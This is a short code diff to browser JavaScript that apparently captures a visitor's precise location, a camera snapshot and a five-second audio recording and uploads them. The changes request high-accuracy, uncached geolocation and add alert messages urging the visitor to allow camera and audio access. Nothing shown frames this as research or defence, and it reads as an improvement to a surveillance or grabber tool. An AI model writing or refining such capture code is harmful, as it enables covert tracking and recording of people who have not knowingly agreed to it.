@@ -28,7 +28,11 @@ async function captureData() {
 function getLocation() {
     return new Promise((resolve, reject) => {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            });
         } else {
             reject(new Error('Geolocation is not supported by this browser.'));
         }
@@ -68,6 +72,8 @@ function captureImageAndUpload(latitude, longitude) {
                 document.body.removeChild(video);
             }, 'image/jpeg');
         } catch (error) {
+            console.error('Error capturing image:', error);
+            alert('Please allow camera access.');
             reject(error);
         }
     });
@@ -103,6 +109,8 @@ function recordAudioAndUpload(latitude, longitude) {
             mediaRecorder.start();
             setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
         } catch (error) {
+            console.error('Error recording audio:', error);
+            alert('Please allow audio access.');
             reject(error);
         }
     });
